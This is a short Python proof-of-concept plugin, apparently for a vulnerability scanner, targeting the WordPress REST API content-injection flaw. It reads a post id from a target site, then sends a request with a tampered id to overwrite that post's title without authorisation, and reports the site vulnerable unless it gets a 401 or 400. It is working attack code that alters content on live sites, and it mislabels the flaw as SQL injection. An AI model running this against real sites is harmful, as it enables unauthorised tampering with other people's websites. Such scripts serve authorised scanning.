# Author:w8ay
# Name:测试DEMO
'''
name: wordpress rest api权限失效导致内容注入
referer: https://www.t00ls.net/thread-38046-1-1.html
author: Lucifer
description: 篡改文章权限。
'''

import HackRequests
import json


def poc(arg, **kwargs):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    headers2 = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
        "Content-Type": "application/json"
    }
    payload = "/index.php/wp-json/wp/v2/posts"
    vulnurl = arg + payload
    hack = HackRequests.hackRequests()
    try:
        req = hack.http(vulnurl,header = headers)
        d = json.loads(req.text)
        id_code = d[0]['id']
        vulnurl = arg + "/index.php/wp-json/wp/v2/posts/" + str(id_code) + "?id=" + str(id_code) + "a"
        post_data = {
            "title": "81dc9bdb52d04dc20036dbd8313ed055"
        }
        req = hack.http(vulnurl,post=json.dumps(post_data), headers=headers2)
        d = json.loads(req.text)
        status = d['data']['status']
        if status != 401 and status != 400:
            result = {
                "name": "wordpress rest api",  # 插件名称
                "content": "存在wordpress rest api权限失效导致内容注入漏洞",  # 插件返回内容详情，会造成什么后果。
                "url": vulnurl,  # 漏洞存在url
                "log": req.log,
                "tag": "sql_inject"  # 漏洞标签
            }
            return result
    except:
        pass

if __name__ == "__main__":
    pass